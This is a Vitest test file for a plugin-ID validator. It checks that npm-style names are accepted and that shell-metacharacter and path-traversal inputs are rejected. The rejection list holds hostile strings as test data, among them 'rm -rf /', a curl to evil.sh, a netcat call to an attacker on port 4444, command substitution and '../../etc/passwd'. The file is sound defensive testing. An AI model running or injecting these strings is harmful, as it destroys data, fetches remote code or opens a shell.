import { describe, it, expect } from 'vitest';
import {
  validatePluginId,
  PLUGIN_ID_RE,
  PLUGIN_ID_MAX_LEN,
} from './validate-id.js';

// ── M-16: plugin id allowlist ────────────────────────────────────────────────

describe('validatePluginId (M-16)', () => {
  describe('accepts', () => {
    const valid = [
      'plugin-name',
      'plugin_name',
      'plugin.name',
      'a',
      '0xcafebabe',
      'my-tool123',
      '@scope/plugin-name',
      '@scope/name.with.dots',
      '@a/b',
      'tool-echo',
    ];
    for (const id of valid) {
      it(`accepts ${JSON.stringify(id)}`, () => {
        const result = validatePluginId(id);
        expect(result.ok).toBe(true);
        if (result.ok) expect(result.id).toBe(id);
      });
    }
  });

  describe('rejects shell metacharacters', () => {
    const injections = [
      'foo; rm -rf /',
      'foo && curl evil.sh',
      'foo | nc attacker 4444',
      '`whoami`',
      '$(whoami)',
      'foo$IFS$9id',
      'foo>out.txt',
      'foo<in.txt',
      'a\nnewline',
      'a\rcr',
      'a\ttab',
      'a b',        // space
      'foo?bar',
      'foo*bar',
      'foo[bar]',
      "foo'bar",
      'foo"bar',
      'foo\\bar',
    ];
    for (const id of injections) {
      it(`rejects ${JSON.stringify(id)}`, () => {
        const result = validatePluginId(id);
        expect(result.ok).toBe(false);
      });
    }
  });

  it('rejects path traversal (..)', () => {
    const result = validatePluginId('foo/../../etc/passwd');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/"\.\."/);
  });

  it('rejects the empty string', () => {
    const result = validatePluginId('');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/empty/i);
  });

  it('rejects whitespace-only input', () => {
    const result = validatePluginId('   ');
    expect(result.ok).toBe(false);
  });

  it('rejects a leading dot', () => {
    // The regex requires the first character to be alphanumeric
    // (after an optional @), so a leading dot is rejected.
    const result = validatePluginId('.hidden');
    expect(result.ok).toBe(false);
  });

  it('rejects a leading hyphen (would look like a flag to npm)', () => {
    const result = validatePluginId('-rf');
    expect(result.ok).toBe(false);
  });

  it('rejects uppercase letters (npm disallows them in published names)', () => {
    const result = validatePluginId('MyPlugin');
    expect(result.ok).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(validatePluginId(undefined).ok).toBe(false);
    expect(validatePluginId(null).ok).toBe(false);
    expect(validatePluginId(42 as unknown).ok).toBe(false);
  });

  it('rejects ids longer than the npm max (214)', () => {
    const longId = 'a'.repeat(PLUGIN_ID_MAX_LEN + 1);
    const result = validatePluginId(longId);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/max length/);
  });

  it('trims surrounding whitespace before validating', () => {
    const result = validatePluginId('  plugin-name  ');
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.id).toBe('plugin-name');
  });

  it('PLUGIN_ID_RE is the published regex', () => {
    // Sanity-check the exported regex matches what we claim in docs.
    expect(PLUGIN_ID_RE.test('plugin-name')).toBe(true);
    expect(PLUGIN_ID_RE.test('@scope/name')).toBe(true);
    expect(PLUGIN_ID_RE.test('ILLEGAL')).toBe(false);
    expect(PLUGIN_ID_RE.test('has space')).toBe(false);
  });
});
